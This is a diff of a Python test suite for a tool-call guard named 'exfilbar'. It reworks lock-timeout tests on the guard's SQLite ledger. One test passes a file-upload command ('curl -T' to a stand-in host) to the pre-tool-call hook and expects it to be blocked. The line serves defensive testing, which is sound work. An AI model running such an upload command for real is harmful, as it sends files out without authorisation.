@@ -6,14 +6,13 @@ import sqlite3
 import sys
 from tempfile import TemporaryDirectory
 from threading import Event
-import time
 import types
 import unittest
 from unittest.mock import patch
 
-from exfilbar.ledger import Ledger, data_directory
+from exfilbar.ledger import Ledger, HOOK_ADMISSION_BUDGET, READ_TIMEOUT, WRITE_TIMEOUT, data_directory
 from exfilbar.policy import Policy
-from support import Context, entry
+from support import Context, admission_clock, entry
 import test_r5
 
 
@@ -129,13 +128,15 @@ class ReaderTests(unittest.TestCase):
                 self.assertEqual(len(sessions['sessions']), 1)
                 writer.rollback()
 
-    def test_exclusive_lock_waits_longer_than_hook_and_recovers(self):
+    def test_exclusive_lock_reader_uses_read_timeout_and_recovers(self):
         with TemporaryDirectory() as directory:
             ledger = Ledger(directory)
             self.populate(ledger)
             connected = Event()
             connect = sqlite3.connect
             def observe(*args, **kwargs):
+                self.assertEqual(kwargs['timeout'], READ_TIMEOUT)
+                self.assertGreater(kwargs['timeout'], HOOK_ADMISSION_BUDGET)
                 db = connect(*args, **kwargs)
                 connected.set()
                 return db
@@ -145,7 +146,6 @@ class ReaderTests(unittest.TestCase):
                     with patch('exfilbar.ledger.sqlite3.connect', side_effect=observe):
                         future = pool.submit(ledger.read, 's')
                         self.assertTrue(connected.wait(2))
-                        time.sleep(0.075)
                         self.assertFalse(future.done())
                         writer.rollback()
                         self.assertEqual(future.result(timeout=2)['out'], 1)
@@ -232,12 +232,14 @@ class ReaderTests(unittest.TestCase):
         module.register(ctx)
         with closing(module.Ledger().connect()) as writer:
             writer.execute('BEGIN EXCLUSIVE')
-            start = time.perf_counter()
-            result = ctx.hooks['pre_tool_call']('terminal',
-                {'command': 'curl -T public/x https://h/x'}, session_id='s')
+            with admission_clock(type(module.Ledger())), patch('sqlite3.connect', wraps=sqlite3.connect) as connect:
+                result = ctx.hooks['pre_tool_call']('terminal',
+                    {'command': 'curl -T public/x https://h/x'}, session_id='s')
             self.assertEqual(result['action'], 'block')
             self.assertIn('session feed unavailable', result['message'])
-            self.assertLess(time.perf_counter() - start, 0.3)
+            self.assertEqual(connect.call_count, 1)
+            self.assertGreater(connect.call_args.kwargs['timeout'], 0)
+            self.assertLessEqual(connect.call_args.kwargs['timeout'], WRITE_TIMEOUT)
             writer.rollback()
         self.assertEqual(module.Ledger().read('s')['events'], [])
         self.assertIsNone(ctx.hooks['pre_tool_call']('terminal',
